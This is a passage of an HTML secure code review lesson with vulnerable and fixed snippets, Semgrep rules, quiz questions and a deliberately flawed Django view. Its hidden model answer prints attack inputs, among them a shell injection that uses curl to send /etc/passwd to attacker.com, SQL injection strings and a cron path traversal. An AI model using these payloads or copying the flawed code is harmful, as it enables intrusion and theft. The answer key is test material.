+<span class="lg"># Fix: atomic database operation with SELECT FOR UPDATE</span>
+<span class="lg">with transaction.atomic():</span>
+<span class="lg">    acct = Account.objects.select_for_update().get(user=user_id)</span>
+<span class="lg">    if acct.balance >= amount:</span>
+<span class="lg">        acct.balance -= amount</span>
+<span class="lg">        acct.save()</span>
+
+<span class="cm"># State machine bypass: can jump directly to final state</span>
+<span class="lb">order.status = 'delivered'              <span class="cm"># no check that previous state was 'shipped'</span></span>
+<span class="lb">order.save()</span>
+
+<span class="lg">VALID_TRANSITIONS = {</span>
+<span class="lg">    'pending': ['paid'],</span>
+<span class="lg">    'paid': ['shipped'],</span>
+<span class="lg">    'shipped': ['delivered'],</span>
+<span class="lg">}</span>
+<span class="lg">if new_status not in VALID_TRANSITIONS.get(order.status, []):</span>
+<span class="lg">    raise ValueError(f"Invalid transition: {order.status} -&gt; {new_status}")</span>
+
+<span class="cm"># Limit bypass: integer overflow or negative amount</span>
+<span class="lb">if withdraw_amount &gt; 0:                 <span class="cm"># doesn't check maximum</span></span>
+<span class="lb">    process_withdrawal(withdraw_amount)</span>
+<span class="lg">if 0 &lt; withdraw_amount &lt;= MAX_WITHDRAWAL:</span>
+<span class="lg">    process_withdrawal(withdraw_amount)</span>
+</pre>
+      </div>
+    </div>
+
+    <div class="vcard vc-pink" id="vc6" onclick="toggleVC('vc6')">
+      <div class="vcard-title">Insecure Deserialization &amp; SSRF</div>
+      <div class="vcard-meta">RCE via pickle, SSRF via URL fetch &bull; CWE-502, CWE-918</div>
+      <div class="vcard-body" id="vc6-b">
+        <h5>Pattern to hunt</h5>
+        <p>Deserialization: look for pickle.loads(), yaml.load() (not safe_load), PHP unserialize(), or Java ObjectInputStream on untrusted data. SSRF: look for URL-fetch functions (requests.get, urllib, fetch) where the URL comes from user input.</p>
+<pre>
+<span class="cm"># Insecure deserialization: pickle with user data = RCE</span>
+<span class="lb">data = pickle.loads(base64.b64decode(request.POST['payload']))</span>
+<span class="lg"># Fix: never deserialize untrusted data with pickle</span>
+<span class="lg">data = json.loads(request.POST['payload'])  <span class="cm"># safe: json cannot execute code</span></span>
+
+<span class="cm"># YAML: load() is dangerous, safe_load() is safe</span>
+<span class="lb">config = yaml.load(user_content)            <span class="cm"># can execute Python via !!python/object</span></span>
+<span class="lg">config = yaml.safe_load(user_content)       <span class="cm"># restricts to primitive types only</span></span>
+
+<span class="cm"># SSRF: user controls the URL being fetched</span>
+<span class="lb">url = request.GET['webhook']</span>
+<span class="lb">resp = requests.get(url)    <span class="cm"># attacker sends: http://169.254.169.254/latest/meta-data/</span></span>
+
+<span class="lg"># Fix: allowlist permitted domains, block internal ranges</span>
+<span class="lg">from urllib.parse import urlparse</span>
+<span class="lg">parsed = urlparse(url)</span>
+<span class="lg">if parsed.hostname not in ALLOWED_WEBHOOK_HOSTS:</span>
+<span class="lg">    raise ValueError("Webhook domain not permitted")</span>
+<span class="lg">if parsed.hostname in ('169.254.169.254', 'metadata.google.internal'):</span>
+<span class="lg">    raise ValueError("Internal addresses not permitted")</span>
+
+<span class="cm"># What SAST misses: SSRF with redirects
+# Initial URL is safe, but server redirects to metadata endpoint
+# Must follow redirects and re-validate at each hop</span>
+</pre>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ADVANCED: EFFICIENT REVIEW AT SCALE -->
+<div class="section">
+  <div class="eyebrow">&#x1F534; Advanced &mdash; Efficient Review at Scale</div>
+  <div class="sec-title">Reviewing code fast without missing what matters</div>
+  <div class="sec-sub">A full manual security review of every PR is not feasible at scale. The advanced practice is combining automated scanning with targeted manual review, writing custom rules for your codebase, and building developer-facing security culture.</div>
+
+  <div class="panel" id="pan-process-adv">
+    <div class="panel-h" onclick="tp('pan-process-adv')">
+      <div class="panel-dot" style="background:var(--accent)"></div>
+      <div class="panel-title">The automated + manual hybrid approach</div>
+      <div class="panel-sub">What automation covers, what only humans can catch, and how to triage the workload</div>
+      <div class="panel-tog">&#x25BC;</div>
+    </div>
+    <div class="panel-body">
+      <table>
+        <tr><th>Automated tools find</th><th>Human review finds</th></tr>
+        <tr><td style="color:var(--green)">Known injection patterns (SQLi, XSS, CMDi signatures)</td><td>Business logic flaws (the logic is correct code that does something harmful)</td></tr>
+        <tr><td style="color:var(--green)">Hardcoded secrets and credentials</td><td>Second-order injection (clean store, dangerous retrieval)</td></tr>
+        <tr><td style="color:var(--green)">Weak cryptographic algorithms (MD5, DES) by name</td><td>Race conditions and TOCTOU in concurrent code</td></tr>
+        <tr><td style="color:var(--green)">Missing security headers and cookie attributes</td><td>Authentication design flaws (JWT algorithm choices, token scope)</td></tr>
+        <tr><td style="color:var(--green)">Dependency CVEs and known unsafe functions</td><td>Missing ownership checks (BOLA) — requires understanding data model</td></tr>
+        <tr><td style="color:var(--yellow)">Simple BOLA patterns (if consistent with custom rules)</td><td>Privilege escalation paths through multiple functions</td></tr>
+        <tr><td style="color:var(--red)">Context-dependent logic (what is "normal" for this app)</td><td>Supply chain risks in new dependencies being introduced</td></tr>
+      </table>
+      <h4>Triaging which code gets deep manual review</h4>
+<pre>
+<span class="cm"># Not every PR needs deep security review. Prioritise based on:
+#
+# ALWAYS review deeply:
+# - Any PR touching authentication, authorisation, or session management
+# - Any PR touching payment processing or financial logic
+# - Any PR introducing new dependencies or changing cryptographic code
+# - Any PR changing permission/access control checks
+# - Any PR touching data export, backup, or logging
+#
+# Review with SAST + spot check:
+# - New API endpoints or significant changes to existing ones
+# - Database model changes (new columns, new relationships)
+# - Configuration changes
+#
+# SAST only, no manual review:
+# - Style/refactoring PRs with no logic changes
+# - Test-only changes
+# - Documentation updates</span>
+</pre>
+    </div>
+  </div>
+
+  <div class="panel" id="pan-custom-rules">
+    <div class="panel-h" onclick="tp('pan-custom-rules')">
+      <div class="panel-dot" style="background:var(--purple)"></div>
+      <div class="panel-title">Writing custom Semgrep rules for your codebase</div>
+      <div class="panel-sub">Teaching your SAST tool about your application's specific security patterns</div>
+      <div class="panel-tog">&#x25BC;</div>
+    </div>
+    <div class="panel-body">
+      <p>Generic Semgrep rules catch generic vulnerability patterns. But your codebase has patterns specific to it: your ORM's unsafe query method, your internal serialization library, your framework's dangerous config. Writing custom rules encodes your security knowledge so it runs automatically on every PR without a human reviewer needing to remember to check.</p>
+<pre>
+<span class="ctag">.semgrep/custom-rules.yml</span>
+rules:
+  <span class="cm"># Rule 1: Flag our legacy raw_query() function</span>
+  - id: unsafe-raw-query
+    pattern: db.raw_query($QUERY, ...)
+    message: >
+      raw_query() bypasses the ORM parameterization.
+      Use db.safe_query() instead, or the ORM QuerySet API.
+    languages: [python]
+    severity: ERROR
+
+  <span class="cm"># Rule 2: Detect direct use of user input in redirect URL</span>
+  - id: open-redirect
+    patterns:
+      - pattern: return redirect($URL)
+      - pattern-either:
+          - pattern-inside: |
+              $URL = request.GET.get(...)
+              ...
+          - pattern-inside: |
+              $URL = request.POST.get(...)
+              ...
+    message: >
+      Potential open redirect: redirect URL comes from user input.
+      Validate URL is relative or in an allowlist of trusted domains.
+    languages: [python]
+    severity: WARNING
+
+  <span class="cm"># Rule 3: Ensure our admin views have the decorator</span>
+  - id: admin-view-missing-decorator
+    patterns:
+      - pattern: |
+          def $FUNC(request, ...):
+            ...
+      - pattern-not: |
+          @require_admin
+          def $FUNC(request, ...):
+            ...
+    paths:
+      include: ["*/admin/views.py", "*/admin/api.py"]
+    message: "Admin view $FUNC is missing @require_admin decorator"
+    languages: [python]
+    severity: ERROR
+
+  <span class="cm"># Rule 4: Flag deserialization of user data</span>
+  - id: unsafe-pickle-load
+    pattern-either:
+      - pattern: pickle.loads(request.$METHOD(...))
+      - pattern: pickle.loads($X) where $X &lt;- request
+    message: "Never deserialize user input with pickle. Use json.loads()."
+    languages: [python]
+    severity: ERROR
+</pre>
+    </div>
+  </div>
+
+  <div class="panel" id="pan-pr-checklist">
+    <div class="panel-h" onclick="tp('pan-pr-checklist')">
+      <div class="panel-dot" style="background:var(--teal)"></div>
+      <div class="panel-title">Security PR review checklist</div>
+      <div class="panel-sub">The 10 questions to answer for every security-relevant PR</div>
+      <div class="panel-tog">&#x25BC;</div>
+    </div>
+    <div class="panel-body">
+      <table>
+        <tr><th>#</th><th>Question</th><th>What to look for</th></tr>
+        <tr><td style="font-weight:500;color:var(--accent)">1</td><td>What untrusted data enters here?</td><td>Request params, headers, file content, external API responses, DB reads</td></tr>
+        <tr><td style="font-weight:500;color:var(--accent)">2</td><td>Is every user-supplied value validated and sanitised before use?</td><td>Type checks, range checks, allowlist validation, not just blocklist</td></tr>
+        <tr><td style="font-weight:500;color:var(--accent)">3</td><td>Is every new database query parameterised?</td><td>No f-strings, no string concatenation, no .format() in SQL</td></tr>
+        <tr><td style="font-weight:500;color:var(--accent)">4</td><td>Does every new endpoint enforce authentication?</td><td>Login required decorator/middleware on every new route</td></tr>
+        <tr><td style="font-weight:500;color:var(--accent)">5</td><td>Does every new data access check object ownership?</td><td>Filter by user=request.user or equivalent on every DB query</td></tr>
+        <tr><td style="font-weight:500;color:var(--accent)">6</td><td>Is any sensitive data being logged?</td><td>Passwords, tokens, PII, payment data in log statements</td></tr>
+        <tr><td style="font-weight:500;color:var(--accent)">7</td><td>Are any new dependencies introduced?</td><td>Check new packages against Snyk/pip-audit; review licence</td></tr>
+        <tr><td style="font-weight:500;color:var(--accent)">8</td><td>Is any new cryptographic code correct?</td><td>Algorithm choice, IV/nonce uniqueness, key management</td></tr>
+        <tr><td style="font-weight:500;color:var(--accent)">9</td><td>Are there concurrent operations that should be atomic?</td><td>Read-check-modify sequences; database transactions needed</td></tr>
+        <tr><td style="font-weight:500;color:var(--accent)">10</td><td>Does the change introduce any configuration that could be misconfigured?</td><td>Env vars, feature flags, debug mode, CORS settings</td></tr>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- QUIZ -->
+<div class="section">
+  <div class="eyebrow">Knowledge Check</div>
+  <div class="sec-title">Code review interview questions</div>
+
+  <div class="quiz-block">
+    <div class="quiz-q">Q1. You are reviewing code that reads a serialized object from a Redis cache and calls pickle.loads() on it. The reviewer before you left a comment: "Safe because this comes from our own Redis, not from the user." Is this assessment correct?</div>
+    <div class="quiz-opts" id="q1">
+      <div class="qo" onclick="doQ('q1',this,'wrong')">Correct &mdash; internal caches are trusted data sources</div>
+      <div class="qo" onclick="doQ('q1',this,'correct')">Incorrect. Cache poisoning is an established attack technique: if an attacker can write to Redis (via SSRF, via an injection in another service that writes to Redis, or via a Redis misconfiguration), they control the deserialized data. pickle.loads() on any externally influenced data — even "internal" — can execute arbitrary Python. The fix is to never store pickle data in Redis; use JSON for all cached data.</div>
+      <div class="qo" onclick="doQ('q1',this,'wrong')">Correct, but only if Redis has authentication enabled</div>
+      <div class="qo" onclick="doQ('q1',this,'wrong')">Incorrect only because Redis can be accessed from the network</div>
+    </div>
+    <div class="quiz-exp" id="q1-exp">The "it comes from our infrastructure, not from the user" reasoning is the implicit trust anti-pattern. Redis is an internal service — but it can be written to by other services, by SSRF attacks, by other deserialization vulnerabilities elsewhere, or by Redis misconfiguration. Once data flows through an intermediary, you cannot guarantee its integrity at deserialization time without additional integrity checks. The correct rule: pickle.loads() on any value you did not generate in the current execution context is dangerous. This includes Redis, database LOB columns, file systems, and message queues. Use JSON (or msgpack for binary efficiency) for all inter-service data exchange. If you genuinely need Python-specific types, sign the pickle data with HMAC before storing and verify before loading.</div>
+  </div>
+
+  <div class="quiz-block">
+    <div class="quiz-q">Q2. During a code review you see a bank transfer endpoint that: (1) reads the user's current balance, (2) checks if balance &gt;= transfer amount, (3) deducts the amount, (4) credits the recipient. What security vulnerability is present and how would you exploit it?</div>
+    <div class="quiz-opts" id="q2">
+      <div class="qo" onclick="doQ('q2',this,'wrong')">SQL injection in the balance lookup query</div>
+      <div class="qo" onclick="doQ('q2',this,'wrong')">Missing authentication on the transfer endpoint</div>
+      <div class="qo" onclick="doQ('q2',this,'correct')">TOCTOU (Time-of-Check Time-of-Use) race condition. Exploit: send 10 concurrent transfer requests simultaneously, each for the full balance. All 10 read the balance before any of them deduct it, all 10 pass the balance check, and all 10 execute the deduction — overdrafting the account by 10x. Fix: wrap the read-check-deduct in a database transaction with SELECT FOR UPDATE, which locks the row and forces serial execution. Or use an atomic UPDATE with a WHERE clause checking the balance: UPDATE accounts SET balance = balance - amount WHERE id = X AND balance >= amount (affected rows = 0 means insufficient funds).</div>
+      <div class="qo" onclick="doQ('q2',this,'wrong')">Cross-site request forgery on the transfer form</div>
+    </div>
+    <div class="quiz-exp" id="q2-exp">The race condition (TOCTOU) is a classic business logic vulnerability that SAST tools almost never catch because the code looks correct at each individual step — the bug is in the relationship between steps across concurrent requests. The attack is straightforward: send many concurrent requests, all for the full balance. With a non-atomic implementation, many of them will read the same pre-deduction balance and each will pass the check. The atomic fix: wrap in a database transaction with SELECT FOR UPDATE (Postgres/MySQL), which acquires a row lock so the second concurrent request blocks until the first commits. The alternative is an atomic conditional UPDATE: UPDATE accounts SET balance = balance - $amount WHERE user_id = $id AND balance >= $amount. If this affects zero rows, the balance was insufficient. This is unraceable because it is a single atomic DB operation.</div>
+  </div>
+</div>
+
+<!-- CHALLENGE -->
+<div class="challenge">
+  <div class="ch-ey">Capstone Challenge &mdash; Review This Code</div>
+  <div class="ch">
+    <h3>Find all security issues in this Django view</h3>
+    <p class="ch-desc">Below is a Django view function for a financial application. Find every security vulnerability, name the class, write the attack scenario, and provide the fixed code.</p>
+    <div class="scenario">
+<pre style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.1);border-radius:5px;padding:1rem;font-size:11.5px;color:rgba(255,255,255,.6);margin:0;">
+import pickle, hashlib, subprocess
+from django.http import JsonResponse
+from django.db import connection
+
+def transfer_funds(request):
+    user_id = request.POST.get('user_id')
+    amount  = request.POST.get('amount')
+    to_acct = request.POST.get('to_account')
+    note    = request.POST.get('note', '')
+
+    # Load user preferences from cache
+    prefs = pickle.loads(request.COOKIES.get('user_prefs', b''))
+
+    # Log the transfer
+    log_path = f"/var/log/transfers/{user_id}.log"
+    subprocess.run(f"echo '{note}' >> {log_path}", shell=True)
+
+    # Check balance
+    with connection.cursor() as cur:
+        cur.execute(f"SELECT balance FROM accounts WHERE user_id='{user_id}'")
+        balance = cur.fetchone()[0]
+
+    if float(balance) >= float(amount):
+        with connection.cursor() as cur:
+            cur.execute(f"UPDATE accounts SET balance=balance-{amount}
+                         WHERE user_id='{user_id}'")
+            cur.execute(f"UPDATE accounts SET balance=balance+{amount}
+                         WHERE user_id='{to_acct}'")
+
+    # Generate receipt token
+    token = hashlib.md5(f"{user_id}{amount}{to_acct}".encode()).hexdigest()
+    return JsonResponse({'status': 'ok', 'token': token})
+</pre>
+    </div>
+    <textarea id="ch-ans" placeholder="Issue 1: Name, attack, fix...
+Issue 2: ...
+[find all issues]"></textarea>
+    <div class="btn-row">
+      <button class="btn btn-p" onclick="checkCh()">Submit</button>
+      <button class="btn btn-g" onclick="revealCh()">Reveal model answer</button>
+    </div>
+    <div class="ch-fb" id="ch-fb"></div>
+  </div>
+</div>
+
+<!-- SUMMARY -->
+<div class="section">
+  <div class="eyebrow">Quick Reference</div>
+  <div class="sec-title">Code review cheat sheet</div>
+  <table>
+    <tr><th>Category</th><th>What to look for</th><th>SAST finds?</th><th>Key pattern</th></tr>
+    <tr><td style="font-weight:500;color:var(--red)">SQLi / CMDi</td><td>User input in db.execute(), subprocess.run(shell=True), os.system()</td><td>Yes</td><td>f-string / .format() / concatenation at call site</td></tr>
+    <tr><td style="font-weight:500;color:var(--orange)">BOLA</td><td>Object lookup by user-supplied ID without owner filter</td><td>With custom rules</td><td>Model.objects.get(id=x) without user= filter</td></tr>
+    <tr><td style="font-weight:500;color:var(--accent)">Auth flaws</td><td>JWT algorithm, missing @login_required, session fixation</td><td>Partial</td><td>algorithms=["none"] allowed, no cycle_key() on login</td></tr>
+    <tr><td style="font-weight:500;color:var(--purple)">Crypto mistakes</td><td>MD5/SHA1 for security, ECB mode, constant IV, random not secrets</td><td>Yes (algorithm names)</td><td>hashlib.md5(), AES.MODE_ECB, random.randint() for tokens</td></tr>
+    <tr><td style="font-weight:500;color:var(--teal)">Race conditions</td><td>Read-check-modify without DB transaction or SELECT FOR UPDATE</td><td>No</td><td>Read balance → check → deduct in 3 separate queries</td></tr>
+    <tr><td style="font-weight:500;color:var(--pink)">Insecure deserialization</td><td>pickle.loads(), yaml.load() on untrusted data</td><td>Yes</td><td>pickle.loads(request.X) or yaml.load(user_content)</td></tr>
+    <tr><td style="font-weight:500;color:var(--red)">SSRF</td><td>requests.get(user_url) without domain allowlist</td><td>Partial</td><td>URL from request.GET/POST passed to fetch function</td></tr>
+    <tr><td style="font-weight:500;color:var(--yellow)">Second-order injection</td><td>Stored value used in unsafe context later</td><td>No</td><td>INSERT (safe), later SELECT + os.system() (dangerous)</td></tr>
+  </table>
+</div>
+
+<div class="nav-footer">
+  <a class="nf-btn" href="#"><span class="nf-dir">&larr; Previous</span><span class="nf-title">18 &mdash; WAF</span></a>
+  <a class="nf-btn next" href="#"><span class="nf-dir">Next Lesson &rarr;</span><span class="nf-title">20 &mdash; RASP</span></a>
+</div>
+
+</div>
+</div>
+
+<!-- REVEAL HTML in hidden DOM -->
+<div id="reveal-html" style="display:none">
+<strong>Model Answer &mdash; Security Issues in transfer_funds()</strong><br><br>
+<strong>Issue 1 &mdash; Insecure Deserialization (CRITICAL, CWE-502):</strong> pickle.loads() on a cookie value the user controls directly. Exploit: craft a malicious pickle payload, base64-encode it, set it as the user_prefs cookie. On next request, Django deserializes it, executing arbitrary Python code as the web application user. Fix: never store serialized Python objects in cookies. Use JSON. If state needs to persist, store it server-side (in session or DB), not in a client-side cookie.<br><br>
+<strong>Issue 2 &mdash; Command Injection (CRITICAL, CWE-78):</strong> The note variable is interpolated into a shell command with shell=True. Exploit: note = "; curl http://attacker.com/exfil?data=$(cat /etc/passwd)" — this terminates the echo command and runs a second shell command. Fix: use subprocess.run(["tee", "-a", log_path], input=note.encode()) with shell=False. Validate the note value. Alternatively, write to the log file using Python's built-in logging module, not subprocess.<br><br>
+<strong>Issue 3 &mdash; SQL Injection x2 (CRITICAL, CWE-89):</strong> Both the SELECT and UPDATE queries use f-string interpolation of user_id, amount, and to_acct. Exploit on SELECT: user_id = "' OR '1'='1" returns all balances. Exploit on UPDATE: user_id = "x'; DROP TABLE accounts;--". Fix: use parameterised queries: cur.execute("SELECT balance FROM accounts WHERE user_id=%s", (user_id,)) and similarly for both UPDATEs.<br><br>
+<strong>Issue 4 &mdash; Race Condition / TOCTOU (CRITICAL):</strong> Balance is checked in one query and deducted in a separate query. Two concurrent transfer requests both read the same balance, both pass the check, both deduct. Fix: use SELECT FOR UPDATE inside a transaction: with transaction.atomic(): cur.execute("SELECT balance FROM accounts WHERE user_id=%s FOR UPDATE", (user_id,)) — this locks the row for the duration of the transaction. Or use an atomic conditional UPDATE and check affected rows.<br><br>
+<strong>Issue 5 &mdash; Missing Authentication (CRITICAL):</strong> No @login_required decorator and no check that the authenticated user matches user_id. Any unauthenticated request can transfer funds from any account. Fix: add @login_required. Verify request.user.id == int(user_id) or raise PermissionDenied. The transfer should use request.user as the source, not a user-supplied user_id.<br><br>
+<strong>Issue 6 &mdash; Weak Receipt Token (HIGH, CWE-327):</strong> MD5 of user_id + amount + to_acct is a predictable, forgeable token. MD5 is broken for security purposes, and the inputs are known/guessable. Fix: use secrets.token_hex(32) for a cryptographically random receipt token, store it in the database with the transaction record, and return it to the user.<br><br>
+<strong>Issue 7 &mdash; Path Traversal in Log Path (HIGH, CWE-22):</strong> user_id is concatenated into the file path without validation. Exploit: user_id = "../../etc/cron.d/backdoor" writes to the cron directory. Fix: validate user_id is a valid integer before use. Use os.path.basename() and restrict to a known safe directory. Better: use Python's logging module, not file paths from user input.<br><br>
+<strong>Issue 8 &mdash; No Input Validation on Amount (HIGH):</strong> amount is taken from POST data and cast to float with no validation. Exploit: amount = "-1000" — negative transfer amount increases the source account balance. amount = "999999999999" — no maximum check. Fix: validate that amount is a positive decimal within policy limits before processing.
+</div>
+
+<script>
+function tp(id) { document.getElementById(id).classList.toggle('open'); }
+document.getElementById('pan-process').classList.add('open');
+
+function toggleVC(id) {
+  var wasOpen = document.getElementById(id).classList.contains('open');
+  document.querySelectorAll('.vcard').forEach(function(c) {
+    c.classList.remove('open');
+    var b = document.getElementById(c.id + '-b');
+    if (b) { b.classList.remove('show'); }
+  });
+  if (!wasOpen) {
+    document.getElementById(id).classList.add('open');
+    var body = document.getElementById(id + '-b');
+    if (body) { body.classList.add('show'); }
+  }
+}
+toggleVC('vc1');
+
+function doQ(qid, el, result) {
+  var container = document.getElementById(qid);
+  container.querySelectorAll('.qo').forEach(function(o) { o.onclick = null; });
+  el.classList.add(result === 'correct' ? 'correct' : 'wrong');
+  var exp = document.getElementById(qid + '-exp');
+  if (exp) { exp.classList.add('show'); }
+}
+
+function checkCh() {
+  var ans = document.getElementById('ch-ans').value.toLowerCase();
+  var fb  = document.getElementById('ch-fb');
+  var checks = [
+    ans.includes('pickle') && (ans.includes('deserializ') || ans.includes('cookie') || ans.includes('rce') || ans.includes('arbitrary')),
+    ans.includes('command') || (ans.includes('injection') && (ans.includes('shell') || ans.includes('subprocess') || ans.includes('note'))),
+    ans.includes('sql') && ans.includes('inject'),
+    ans.includes('race') || ans.includes('toctou') || ans.includes('concurren') || ans.includes('atomic'),
+    ans.includes('auth') && (ans.includes('login') || ans.includes('missing') || ans.includes('require')),
+    ans.includes('md5') || ans.includes('weak') && ans.includes('token'),
+    ans.includes('path') && (ans.includes('traversal') || ans.includes('user_id') && ans.includes('log')),
+    ans.includes('amount') && (ans.includes('negative') || ans.includes('validat') || ans.includes('float'))
+  ];
+  var score = checks.filter(Boolean).length;
+  fb.className = 'ch-fb show ' + (score >= 6 ? 'good' : 'hint');
+  if (score >= 6) {
+    fb.textContent = 'Excellent — ' + score + '/8 issues found. This function is a comprehensive catalogue of common financial application vulnerabilities. The most critical: pickle.loads() on a cookie is a direct RCE vector with no authentication needed — the most severe possible outcome. The race condition on the balance check is less obvious but practically exploitable in any financial application that receives concurrent requests.';
+  } else if (score >= 4) {
+    fb.textContent = 'Good — ' + score + '/8 found. Important ones to revisit: (1) The TOCTOU race condition: the balance check and deduction are separate DB operations. Two concurrent requests both pass the balance check. Fix: SELECT FOR UPDATE inside a transaction. (2) Missing auth: no @login_required, and user_id comes from POST data — any user can transfer from any account. (3) Negative amount: float(amount) with no minimum check allows a negative transfer that increases the source balance.';
+  } else {
+    fb.textContent = 'Work through the function line by line. Ask: what user-controlled value is used here? Line 8: cookie value in pickle.loads = RCE. Line 11: note in shell command = command injection. Lines 14-17: user_id in SQL = SQLi. Lines 19-23: balance check then deduction = race condition. No @login_required = missing auth. MD5 receipt = weak crypto. f-string path = path traversal. No amount validation = business logic.';
+  }
+}
+
+function revealCh() {
+  var fb  = document.getElementById('ch-fb');
+  var src = document.getElementById('reveal-html');
+  fb.className = 'ch-fb show reveal';
+  fb.innerHTML = src ? src.innerHTML : 'Model answer unavailable.';
+}
+</script>
+</body>
+</html>
